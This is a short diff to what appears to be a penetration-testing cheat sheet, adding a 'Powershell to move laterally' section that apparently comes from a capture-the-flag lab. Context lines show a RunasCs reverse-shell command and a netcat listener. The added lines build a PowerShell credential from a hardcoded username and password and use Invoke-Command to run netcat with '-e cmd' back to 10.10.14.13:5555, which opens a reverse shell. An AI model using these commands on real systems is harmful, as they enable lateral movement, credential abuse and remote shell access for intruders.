@@ -365,6 +365,17 @@ check zip,gz,7z,stix,rar files
 runascs.exe username password powershell.exe -r lhost:lport
 nc -nlvp 7777
 ```
+##### Powershell to move laterally
+```
+ps > $env:ComputerName
+ps > $user = "CONTROL\hector"
+ps > $pass = "l33th4x0rhector"
+ps > $secstr = New-Object -TypeName System.Security.SecureString
+ps > $pass.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
+ps > $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $secstr
+ps > Invoke-Command -Computer localhost -Credential $cred -ScriptBlock { whoami }
+ps > Invoke-Command -ScriptBlock {\windows\temp\nc.exe -e cmd 10.10.14.13 5555 } -computer localhost
+```
 
 ### Linux
 ##### Directory Permissions
